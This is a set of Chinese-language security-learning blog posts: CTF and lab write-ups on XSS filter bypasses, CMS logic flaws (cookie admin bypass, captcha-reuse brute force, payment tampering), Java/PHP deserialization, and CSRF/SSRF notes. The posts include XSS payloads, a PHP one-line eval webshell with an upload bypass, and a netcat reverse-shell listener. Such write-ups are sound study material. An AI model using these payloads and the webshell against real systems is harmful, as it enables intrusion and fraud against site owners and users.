<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;onclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>来到第四关,与第三关一样,把payload中的’换成”,之后点击搜索框即可。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>继续填入上关的payload,右键-查看元素,发现on被替换成o_n了。<br><img src="https://pic.imgdb.cn/item/65280046c458853aefcb4287.png" alt="图六" title="level-5.1"><br>代码审计,发现过滤了script标签和on关键字。<br>没事,我们还有伪协议–超链接跳转。<br>填入下列palayload</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-string">&quot;&gt;&lt;a href=&quot;</span>javascrip<span class="hljs-variable">t:alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">&quot;&gt;</span><br></code></pre></td></tr></table></figure>
<p>之后页面会出现一个”&gt;(一举两得,即闭合,又是超链接)的超链接<br><img src="https://pic.imgdb.cn/item/652801acc458853aefd2602a.png" alt="图七" title="level-5.2"><br>点击这个链接,成功通关。</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>继续使用上一关的payload看行不行,发现不行,只好看代码了。<br><img src="https://pic.imgdb.cn/item/65280271c458853aefd5f767.png" alt="图八" title="level-6.1"><br>不给活路啊,过滤了一大堆。<br>但细看,他并没有大小写转换啊,也就是说我可以利用大小写绕过,填入以下payload</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;Onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure>
<p>点击搜索框,成功过关。</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>我继续输入上一关的payload,发现on直接被替换成空串了<br><img src="https://pic.imgdb.cn/item/65280385c458853aefdb9d68.png" alt="图九" title="level-7.1"><br>简单,尝试重(双)写绕过,看它是否循环过滤,填入以下payload</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;oonnclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure>
<p>点击搜索框,成功通关。</p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这里是把我们输入的payload点击添加友情链接后就可以直接跳转了,简单,填入以下payload,正好利用伪协议。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure>
<p>添加友链后,但是代码里面进行了script的替换<br><img src="https://pic.imgdb.cn/item/652805e0c458853aefe7aa0a.png" alt="图十" title="level-8.1"><br>那我们只要让代码识别不出是script就行，把script里面随便一个字母(如s)通过html编码，然后再通过url编码。<br><img src="https://pic.imgdb.cn/item/652805e0c458853aefe7aa0a.png" alt="图十一" title="level-8.2"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>%<span class="hljs-number">26</span>%<span class="hljs-number">23</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">3</span>bcript:alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<p>理论上应该可以,但我通关失败,提示403错误,换了几个浏览器都不行,望大佬斧正。</p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>业务逻辑|白盒环境下某cms渗透测试</title>
    <url>/2023/10/21/cmslogicLoudong/</url>
    <content><![CDATA[<h2 id="熊海cms"><a href="#熊海cms" class="headerlink" title="熊海cms"></a>熊海cms</h2><p><a href="http://127.0.0.1/xionghaicms/admin/?r=login%E8%BF%9B%E5%85%A5%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%E3%80%82">http://127.0.0.1/xionghaicms/admin/?r=login进入登陆界面。</a><br>代码审计<br>首先打开xionghaicms\index.php,注释写的很清楚,存在一个关联性比较大的”index.php”文件<br>(其次还应该想到,这里存在一个include函数,那么可能存在文件包含漏洞)<br><img src="https://pic.imgdb.cn/item/6533d27ac458853aefae60f5.png" alt="图一" title="代码审计"><br>那么我们就尝试在浏览器访问这个文件<br><a href="http://127.0.0.1/xionghaicms/admin/?r=index">http://127.0.0.1/xionghaicms/admin/?r=index</a><br>发现未登录状态下,自动回退到上一个登录界面,即”login.php”<br>继续,由于是访问admin\files文件夹下的文件,那么我们来到这个文件夹。找到logic.php,xionghaicms\admin\files\logic.php。<br>发现引入了一个checklogic.php文件,打开康康。<br>有这么一段代码,意思是只要接收到的cookie不为空,就可以直接进入管理员后台;反之回退到login界面。<br>那么就是判断cookie的逻辑出了问题,可能是开发人员为了省事,把cookie的验证简化了,出现了业务逻辑越权漏洞。<br>注意,这个cookie是以”user”字段接受的,意思是属性为”user”,只要这个属性值不为空,就可以绕过登录直接进入后台<br><img src="https://pic.imgdb.cn/item/6533d283c458853aefae9492.png" alt="图二" title="代码审计"><br>修改cookie,要以user字段接收,任意值都可,只要不为空。<br><img src="https://pic.imgdb.cn/item/6533d28ec458853aefaeccff.png" alt="图三" title="bp修改cookie"><br>成功进入后台。<br><img src="https://pic.imgdb.cn/item/6533d2b3c458853aefaf86b6.png" alt="图四" title="无密码进入xhcms后台"><br>但是仅仅是看到这个界面,点击里面的功能还是会跳到登陆界面。<br>但是,只要抓包,每点击一个页面再一次修改cookie(和上面一样),即可正常访问网站。</p>
<h2 id="damicms"><a href="#damicms" class="headerlink" title="damicms"></a>damicms</h2><p>关于这个cms,测试到两个漏洞,一个是验证码复用漏洞,另一个是支付篡改漏洞。</p>
<h3 id="验证码复用-爆破"><a href="#验证码复用-爆破" class="headerlink" title="验证码复用+爆破"></a>验证码复用+爆破</h3><p>参考:<a href="https://blog.csdn.net/YangGouGuo/article/details/131177565">https://blog.csdn.net/YangGouGuo/article/details/131177565</a><br>借用此篇文章的思路,特意整了个disearch扫描目录。<br>发现admin.php可能是一个管理员界面,进入,果然。<br><img src="https://pic.imgdb.cn/item/6533e49ac458853aeffd16dc.png" alt="图五" title="admin"><br>这里我们可以尝试爆破获取管理员账号与密码,但是这里存在一个验证码,很难处理。借助迪总的演示,发现此处的验证码存在一个复用的问题。<br>不多说,直接操作。<br>抓包,账号密码随便输入,但是验证码要输入正确。<br>然后把这个数据包发送到intruder爆破模块,攻击模式选择 cluster bomb集束炸弹模式,clean&#x2F;add双联操作,添加payload不赘述,具体见上述参考。<br><img src="https://pic.imgdb.cn/item/6533e4a2c458853aeffd3984.png" alt="图六" title="爆破"><br>爆破即可,看到不一样长度的数据包点开查看,一般就可以了。<br>成功进入管理后台<br><img src="https://pic.imgdb.cn/item/6533e4b6c458853aeffd96f2.png" alt="图七" title="成功夺取webshell"></p>
<h3 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h3><p>1、修改商品数量达到”零元购”的目的。<br>进入到购买商品的界面,随便选一件进行购买,点击立即购买后抓包。<br><img src="https://pic.imgdb.cn/item/65368462c458853aef27f780.jpg" alt="图八" title="抓包"><br>将此处的”1”改为”-1”后放包。<br><img src="https://pic.imgdb.cn/item/6536846fc458853aef282cf2.jpg" alt="图九" title="改包"><br>可以看到价格变成了-6000,也就相当于”零元购”。<br>2、修改商品价格达到”低价购”的目的。<br>买n件商品,点击提交订单,抓包后将数据包的price值改为6。<br><img src="https://pic.imgdb.cn/item/653684d4c458853aef29cbb3.jpg" alt="图十" title="抓包"><br>可以看到原本总价6w的商品,仅需60块钱,也就相当于”低价购”。<br><img src="https://pic.imgdb.cn/item/653684e4c458853aef2a0d81.jpg" alt="图十一" title="低价购"><br>3、修改订单的商品id值以及商品的名称实现另一种”低价购”–就是以低价位购买高价位产品。<br>大米测试产品是相对于大米手机cms是高价位产品。<br>首先点击大米测试产品,提交订单并且抓包,获取其商品id值以及商品的名称的数据包信息,之后直接退出。<br><img src="https://pic.imgdb.cn/item/653684f1c458853aef2a41c3.jpg" alt="图十二" title="获取目标商品数据包信息"><br>随后点击手机大米cms这个商品,提交订单并抓包,将对应的品id值以及商品的名称的数据包信息改成之前获取的。<br><img src="https://pic.imgdb.cn/item/653684fdc458853aef2a7771.jpg" alt="图十三" title="改包"><br>可以看到,本来我是要以5.4k的价位购买大米手机cms的,但是这个支付界面直接变成了以5.4k的价位购买到了6k价位的大米测试产品。<br><img src="https://pic.imgdb.cn/item/65368510c458853aef2ac38a.jpg" alt="图十四" title="成功低价购"></p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化|反弹shell</title>
    <url>/2023/10/23/fanxulieJava/</url>
    <content><![CDATA[<h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>写在前面:java的反序列化,听一节课是不足以了解的,下面提供一些关于此方面知识的链接,供大家学习。<br><a href="https://zhuanlan.zhihu.com/p/637077178">https://zhuanlan.zhihu.com/p/637077178</a><br><a href="https://blog.csdn.net/qq_21484461/article/details/131406185">https://blog.csdn.net/qq_21484461/article/details/131406185</a><br><img src="https://pic.imgdb.cn/item/6535d032c458853aef22a155.png" alt="图一" title="java反序列化"><br>java中调用api实现序列化&#x2F;反序列化<br><img src="https://pic.imgdb.cn/item/6535d0a5c458853aef238e48.png" alt="图二" title="Java中API实现"><br>1、序列化和反序列化–前面已经明确地区分过<br>序列化(Serialization): 将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区–将程序对象（内存中的数据）转为方便存储的格式存储在文件（磁盘中）,也就是内存-&gt;磁盘。<br>反序列化：从存储区中读取该数据，并将其还原为对象的过程，成为反序列化–磁盘取出,读到内存。<br>2、java反序列化常用的工具&#x2F;脚本(生成payload):ysoserial<br><a href="https://blog.csdn.net/weixin_34275734/article/details/92243836">https://blog.csdn.net/weixin_34275734/article/details/92243836</a></p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Java 反序列化及命令执行代码测试:5:50</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">WebGoat_Javaweb 靶场反序列化测试:14:00</a><br>思路:<br><img src="https://pic.imgdb.cn/item/653633cfc458853aef2c1c60.jpg" alt="图三" title="思路"><br>1、序列化-》base64-》base64解密-》反序列化<br>2、这里进行对象读取时,会将读取的东西执行<br>！攻击–解码+反序列化+构造自己想要的command(payload)+序列化+base64<br>3、下方的特征可以作为序列化的标志参考:<br>一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br>或者如果以aced开头，那么他就是这一段java序列化的16进制。<br>4、利用反序列化时,要反弹shell(解决回显问题)–nc -lvvp 端口号 –监听命令反弹shell接收数据。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">网鼎杯javaweb-java反序列化(难-重点):50:00</a><br>思路:<br>![图四](<a href="https://pic.imgdb.cn/item/653633ebc458853aef2c5cd9.jpg">https://pic.imgdb.cn/item/653633ebc458853aef2c5cd9.jpg</a> “解析–根据数据包判断”注入点”)<br>1、登录后,常见的数据包会返回cookie、用户信息、但是这道题的回显是一段序列化的数据,而上述说的用户信息就包含在里面。<br>2、把获得的那一串先base64 decode,再用工具解析成(还原)数据;然后生成payload(序列化、bin文件),再base64 code,发送过去。<br>3、nc -lvvp 端口号 –监听命令(反弹shell接收数据)。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">网鼎杯javaweb-java反序列化(难-重点)-总结:1:19:00</a><br>1、白盒看代码判断有无java反序列化漏洞,而黑盒看数据包?。<br>2、此篇文章只是从代码分析java反序列化,但实际仍有很多类型。</p>
<h2 id="java反序列化与php反序列化区别"><a href="#java反序列化与php反序列化区别" class="headerlink" title="java反序列化与php反序列化区别"></a>java反序列化与php反序列化区别</h2><p>1、php的反序列化是依靠在不同时期自动调用的魔术方法(有类)以及代码相关函数(无类)有关;java反序列化是以代码中序列化与反序列化的转变过程中的代码执行相关。<br>2、序列化和反序列化本身没有漏洞点，只是为了实现数据的完整高效的传输。<br>PHP反序列漏洞是由于类里面的魔术方法调用了某个函数，该危险函数又调用了别的函数，最终执行到了危险函数的位置。<br>JAVA反序列化漏洞是由于开发者重写了readObject方法，该readObject方法方法调用了别的方法，最终执行到了例如Transfrom方法的危险方法（链式调用）。<br>3、Java的反序列化主要用于在分布式系统中进行对象的远程传输和存储，而PHP的反序列化主要用于在Web应用中进行数据的传输和存储。因此，在实际应用中，Java的反序列化更加复杂和灵活，而PHP的反序列化更加简单和直观。<br>参考:<a href="https://blog.csdn.net/weixin_58783105/article/details/132975714">https://blog.csdn.net/weixin_58783105/article/details/132975714</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF以及SSRF</title>
    <url>/2023/10/13/csrf/</url>
    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>CSRF（Cross-site Request Forgery，跨站请求伪造）是一种针对网站的恶意利用。<br>CSRF攻击可以利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。<br>CSRF与XSS听起来很像，但攻击方式完全不同。XSS攻击是利用受信任的站点攻击客户端用户，而CSRF是伪装成受信任的用户攻击受信任的站点。<br>参考:<br>CSRF漏洞详解:<a href="https://blog.csdn.net/xcxhzjl/article/details/121411039">https://blog.csdn.net/xcxhzjl/article/details/121411039</a></p>
<h3 id="实现前提"><a href="#实现前提" class="headerlink" title="实现前提"></a>实现前提</h3><p>●用户成功登陆了网站系统，能执行授权的功能。!!!<br>●目标用户访问了攻击者构造的恶意URL,比如恶意引导用户点击含有恶意URL的网址。</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">CSRF–pikachu演示:5:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">检测有无CSRF漏洞:11:40</a><br>1、一般存在于有修改、更新、删除个人信息的页面。<br>2、可以xss配合csrf。</p>
<h3 id="CSRF防御方案"><a href="#CSRF防御方案" class="headerlink" title="CSRF防御方案"></a>CSRF防御方案</h3><p>1、当用户发送重要的请求时需要输入原始密码。<br>2、设置随机 Token。(最有效)<br>Token:相当于是每一个数据包的编号,若检测当前数据包的Token对应不上,则直接取消此操作。是服务器端源码生成的，可以放在一个hidden表单里面，客户端提交的时候post回服务端检验。<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，<br>黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）–同源策略。<br>4、设置验证码。<br>5、限制请求方式只能为 POST。</p>
<h2 id="SSRF-important"><a href="#SSRF-important" class="headerlink" title="SSRF(important)"></a>SSRF(important)</h2><p>原理：<a href="https://www.cnblogs.com/happystudyhuan/p/11802961.html">https://www.cnblogs.com/happystudyhuan/p/11802961.html</a></p>
<h3 id="SSRF漏洞介绍："><a href="#SSRF漏洞介绍：" class="headerlink" title="SSRF漏洞介绍："></a>SSRF漏洞介绍：</h3><p>　　SSRF漏洞(服务器端请求伪造):是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。<br><img src="https://pic.imgdb.cn/item/652905a7c458853aef5c880c.png" alt="图一" title="SSRF漏洞知识点"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">简单SSRF漏洞:30：00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">对SSRF漏洞的“抽象”解释:40:00</a></p>
<h3 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h3><p>　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">其实就是借助服务器的SSRF漏洞,使服务器成为一个“跳板”,通过这个“跳板”便可以探针内网。<br></code></pre></td></tr></table></figure>
<h3 id="SSRF漏洞利用手段："><a href="#SSRF漏洞利用手段：" class="headerlink" title="SSRF漏洞利用手段："></a>SSRF漏洞利用手段：</h3><p>通过http、file(访问服务器自身–本地,无法探测内网)、dict、ftp、gopher等协议<br>　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）–端口扫描；<br>　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；<br>　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；<br>　　4.攻击内网或外网有漏洞的Web应用；<br>　　5.使用file：&#x2F;&#x2F;&#x2F;协议读取本地文件(或其他协议)</p>
<h3 id="SSRF漏洞较容易出现地点："><a href="#SSRF漏洞较容易出现地点：" class="headerlink" title="SSRF漏洞较容易出现地点："></a>SSRF漏洞较容易出现地点：</h3><p>　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　<br>　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）<br>　　3.在线翻译<br>　　4.图片加载与下载：通过URL地址加载或下载图片<br>　　5.图片、文章收藏功能<br>　　6.未公开的api实现及调用URL的功能<br>　　7.从URL关键字中寻找<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">SSRF示例演示–本地:51:00</a><br>！！！<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">SSRF示例演示–实战(真实示例):1：00:00</a><br>注意:<br>1、如何知道其内网段?<br>内网段一般都是10.xx.xx.xx或192.xx.xx.xx,用字典爆破,看哪个有返回信息即可。<br>2、<br><img src="https://pic.imgdb.cn/item/6529407fc458853aef03fd17.png" alt="图二" title="使用SSRF时,网站脚本类型与应当选用何种协议"></p>
]]></content>
      <categories>
        <category>CSRF|SSRF</category>
      </categories>
      <tags>
        <tag>CSRF|SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>200wCSOE|Recording</title>
    <url>/2023/10/29/csoeDGUT/</url>
    <content><![CDATA[<h2 id="actf-2021-baby-serialize–代码审计-php反序列化"><a href="#actf-2021-baby-serialize–代码审计-php反序列化" class="headerlink" title="actf_2021_baby_serialize–代码审计|php反序列化"></a>actf_2021_baby_serialize–代码审计|php反序列化</h2><p>开启靶机,先看一遍源码,发现unserialize()函数<br><img src="https://pic.imgdb.cn/item/653dc16dc458853aefd5d63b.jpg" alt="图一" title="发现unserialize()函数"><br>这个函数就是php的反序列化函数(看到存在这个函数一般就判定考反序列化了),顺便一提serialize()是序列化函数,这两个函数一般配套使用。<br>首先代码审计,发现存在一个类User,那么这是一道存在类情况的反序列化。<br>里面含有魔术方法,若之前没做过或学过,具体看<a href="https://fzsecurity-github.github.io/2023/10/21/fanxuliePHP/">https://fzsecurity-github.github.io/2023/10/21/fanxuliePHP/</a><br>继续,类里面含有两个变量以及三个方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$Username</span> = <span class="hljs-string">&quot;0xDktb&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$Password</span> = <span class="hljs-string">&quot;0xDktb111&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Username</span> = <span class="hljs-string">&quot;0xDktb&quot;</span>;<br>        <span class="hljs-variable">$Password</span> = <span class="hljs-string">&quot;0xDktb123&quot;</span>;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Username == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;Username;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>继续往下,创建一个类对象用来接收get接收的内容,随后对它进行反序列化。</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$user</span> = new User();</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;<br>    <span class="hljs-symbol">$</span>user = unserialize(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>最后如果类内方法判断为真,那么输出包含进来的flag.php文件,即flag。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>($user-&gt;<span class="hljs-built_in">isAdmin</span>())&#123;<br>    echo $flag<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>那么解题思路也就出来了:就是自己写一个php程序,创建一个类(与题目相同),然后把Username赋值为admin,随后序列化输出即可(这里有一个注意点,等下说)。<br>打开php在线运行工具,进行编程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$Username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$Password</span> = <span class="hljs-string">&quot;0xDktb111&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Username</span> = <span class="hljs-string">&quot;0xDktb&quot;</span>;<br>        <span class="hljs-variable">$Password</span> = <span class="hljs-string">&quot;0xDktb123&quot;</span>;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Username == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;Username;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//两种输出形式:var_dump(urlencode(serialize($user)))</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里我序列化后为什么要进行url编码?<br>因为class类内变量的权限为private,序列化后默认有%00,但是不进行url编码时,在线工具运行的结果是这样的<br><img src="https://pic.imgdb.cn/item/653dc1d8c458853aefd726fe.jpg" alt="图二" title="法一url编码"><br>你也可以选择不进行url编码,但是要将没显示出来的字符改为%00<br><img src="https://pic.imgdb.cn/item/653dc198c458853aefd65a05.jpg" alt="图三" title="法二手动加%00"><br>完成后,就可以把这个payload输入网址栏,成功获取flag<br><img src="https://pic.imgdb.cn/item/653dc1eec458853aefd76554.jpg" alt="图四" title="获取flag"></p>
<h2 id="aurora-2021-easyupload"><a href="#aurora-2021-easyupload" class="headerlink" title="aurora_2021_easyupload"></a>aurora_2021_easyupload</h2><p>较简单,直接上传一个含有一句话木马的php文件,通过MINE属性值的绕过检测,随后蚁剑连接即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里讲一下我做的时候的误区:<br>(1)、我上来先搞了个图片马并且成功上传了,但是怎么都连接不上,后来就查阅资料了解到图片马是要配合解析漏洞或文件包含漏洞才可使用的。<br>(2)、走出上一个误区后,我开始直接上传php文件,发现存在过滤,那就开始尝试绕过过滤。我一开始是先把MIME属性改为image&#x2F;png的了,然后我又在文件名上操作,导致上传失败。后来才没改文件名,直接是.php的格式,这才上传成功。<br>学(复习)到:<br>1、测试时,先改MIME属性值,单独测试后再考虑大小写等绕过方式<br>2、图片马:<br>除非网站有解析错误,不然网站不会解析这个图片马;<br>图片马要配合文件包含才可getshell</p>
<h2 id="0ctf-2016-unserialize"><a href="#0ctf-2016-unserialize" class="headerlink" title="0ctf_2016_unserialize"></a>0ctf_2016_unserialize</h2><p>打开靶机,是一个登陆界面<br><img src="https://pic.imgdb.cn/item/65479069c458853aefbc904a.png" alt="图"><br>查看源码,只知道账号密码是以post方式提交的,除此之外一无所获。<br>尝试着抓包,看看有没有隐藏一些秘密,但是看来看去看不出端倪。<br>然后尝试目录扫描,挨个点开,发现一个疑似源码的压缩包,下载到本地,开始代码审计。<br><img src="https://pic.imgdb.cn/item/65479069c458853aefbc904a.png" alt="图"><br>点开config.php,发现一个数据库用户名root。<br><img src="https://pic.imgdb.cn/item/65479069c458853aefbc904a.png" alt="图"><br>查看其他,php文件,发现这几个文件是具有相关性的。<br>首先我们登陆的时候,会调用index.php验证,而在index.php有这样一句代码:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">require<span class="hljs-constructor">_once(&#x27;<span class="hljs-params">class</span>.<span class="hljs-params">php</span>&#x27;)</span>;<br></code></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>php|反序列化|本地|bugku</title>
    <url>/2023/10/24/fanxuliehuaPrac/</url>
    <content><![CDATA[<h2 id="本地编写简单代码测试"><a href="#本地编写简单代码测试" class="headerlink" title="本地编写简单代码测试"></a>本地编写简单代码测试</h2><h3 id="无类情况"><a href="#无类情况" class="headerlink" title="无类情况"></a>无类情况</h3><p>1、无类情况下,代码的序列化测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;dralin&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$key</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行结果:<br><img src="https://pic.imgdb.cn/item/6537d12dc458853aef7406a7.jpg" alt="图一" title="无类序列化结果"><br>s:6:”dralin”;<br>s:字符串;6:字符串长度;dralin:字符串内容。<br>2、无类情况下,代码的反序列化测试</p>
